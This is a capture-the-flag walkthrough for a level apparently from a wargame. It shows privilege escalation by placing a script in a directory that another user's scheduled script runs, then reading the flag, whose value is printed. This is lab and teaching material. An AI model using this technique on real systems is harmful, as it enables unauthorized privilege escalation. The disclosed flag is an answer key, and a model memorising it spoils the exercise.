# level05

We got some intel from level00:

```shell
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver

/opt/openarenaserver

/usr/sbin/openarenaserver

/rofs/opt/openarenaserver

/rofs/usr/sbin/openarenaserver
```

1. examinate the file

```shell
cat /usr/sbin/openarenaserver
```

shows a shell script that runs all scripts in `/opt/openarenaserver`

2. examinate scripts' permissions

```shell
ls -la /usr/sbin/openarenaserver
```

shows that this script belongs to flag05, thus executing it with crontab allows us to run commands as flag05

3. create a custom script

```shell
echo -e "getflag > /opt/openarenaserver/flag" > /opt/openarenaserver/exploit.sh
```

4. make it run as flag05 with flag05 script and crontab

```shell
crontab -e
```

```shell
* * * * * /opt/openarenaserver/exploit.sh
```

to execute exploit every minute

wait for <= 1 minute for crontab to execute

5. pwn the flag

```shell
cat /opt/openarenaserver/flag
```

gives flag: `viuaaale9huek52boumoomioc`
